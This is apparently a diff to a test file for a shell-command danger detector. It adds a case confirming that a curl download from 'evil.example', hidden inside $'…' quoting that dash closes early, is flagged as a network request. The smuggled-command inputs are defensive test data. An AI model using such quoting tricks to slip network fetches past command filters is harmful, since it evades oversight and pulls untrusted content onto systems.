@@ -412,6 +412,10 @@ describe('detectDangerousPatterns — verb-position commands', () => {
     expect(detectDangerousPatterns('git log \\"; curl https://evil.example \\"')).toContain(
       'Network request (curl/wget)',
     );
+    // The same hiding through `$'…'`, which dash closes at the first `'` (#696 review).
+    expect(
+      detectDangerousPatterns("cat f $'a\\' ; curl https://evil.example -o x; echo 'x\\'"),
+    ).toContain('Network request (curl/wget)');
   });
 
   it('does NOT flag the words as arguments to something else', () => {
